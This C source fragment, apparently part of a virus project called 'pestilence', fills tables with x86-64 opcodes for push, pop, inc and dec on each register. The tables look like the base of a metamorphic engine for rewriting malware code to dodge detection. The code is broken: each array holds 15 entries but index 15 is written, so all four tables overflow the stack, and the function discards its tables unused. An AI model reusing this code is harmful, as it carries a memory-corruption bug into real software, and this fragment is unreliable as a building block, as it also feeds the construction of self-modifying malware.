#include "pestilence.h"

void metamorph(void)
{
	uint32_t tab_push[15];
	uint32_t tab_pop[15];
	uint32_t tab_inc[15];
	uint32_t tab_dec[15];

	tab_push[0] = 0x50; //rax
	tab_push[1] = 0x51; //rcx
	tab_push[2] = 0x52; //rdx
	tab_push[3] = 0x53; //rbx
	tab_push[4] = 0x54; //rsp
	tab_push[5] = 0x55; //rbp
	tab_push[6] = 0x56; //rsi
	tab_push[7] = 0x57; //rdi
	tab_push[8] = 0x4150; //r8
	tab_push[9] = 0x4151; //r9
	tab_push[10] = 0x4152; //r10
	tab_push[11] = 0x4153; //r11
	tab_push[12] = 0x4154; //r12
	tab_push[13] = 0x4155; //r13
	tab_push[14] = 0x4156; //r14
	tab_push[15] = 0x4157; //r15

	tab_pop[0] = 0x58; //rax
	tab_pop[1] = 0x59; //rcx
	tab_pop[2] = 0x5a; //rdx
	tab_pop[3] = 0x5b; //rbx
	tab_pop[4] = 0x5c; //rsp
	tab_pop[5] = 0x5d; //rbp
	tab_pop[6] = 0x5e; //rsi
	tab_pop[7] = 0x5f; //rdi
	tab_pop[8] = 0x4158; //r8
	tab_pop[9] = 0x4159; //r9
	tab_pop[10] = 0x415a; //r10
	tab_pop[11] = 0x415b; //r11
	tab_pop[12] = 0x415c; //r12
	tab_pop[13] = 0x415d; //r13
	tab_pop[14] = 0x415e; //r14
	tab_pop[15] = 0x415f; //r15

	tab_inc[0] = 0x48ffc0; //rax
	tab_inc[1] = 0x48ffc1; //rcx
	tab_inc[2] = 0x48ffc2; //rdx
	tab_inc[3] = 0x48ffc3; //rbx
	tab_inc[4] = 0x48ffc4; //rsp
	tab_inc[5] = 0x48ffc5; //rbp
	tab_inc[6] = 0x48ffc6; //rsi
	tab_inc[7] = 0x48ffc7; //rdi
	tab_inc[8] = 0x49ffc0; //r8
	tab_inc[9] = 0x49ffc1; //r9
	tab_inc[10] = 0x49ffc2; //r10
	tab_inc[11] = 0x49ffc3; //r11
	tab_inc[12] = 0x49ffc4; //r12
	tab_inc[13] = 0x49ffc5; //r13
	tab_inc[14] = 0x49ffc6; //r14
	tab_inc[15] = 0x49ffc7; //r15

	tab_dec[0] = 0x48ffc8; //rax
	tab_dec[1] = 0x48ffc9; //rcx
	tab_dec[2] = 0x48ffca; //rdx
	tab_dec[3] = 0x48ffcb; //rbx
	tab_dec[4] = 0x48ffcc; //rsp
	tab_dec[5] = 0x48ffcd; //rbp
	tab_dec[6] = 0x48ffce; //rsi
	tab_dec[7] = 0x48ffcf; //rdi
	tab_dec[8] = 0x49ffc8; //r8
	tab_dec[9] = 0x49ffc9; //r9
	tab_dec[10] = 0x49ffca; //r10
	tab_dec[11] = 0x49ffcb; //r11
	tab_dec[12] = 0x49ffcc; //r12
	tab_dec[13] = 0x49ffcd; //r13
	tab_dec[14] = 0x49ffce; //r14
	tab_dec[15] = 0x49ffcf; //r15
}
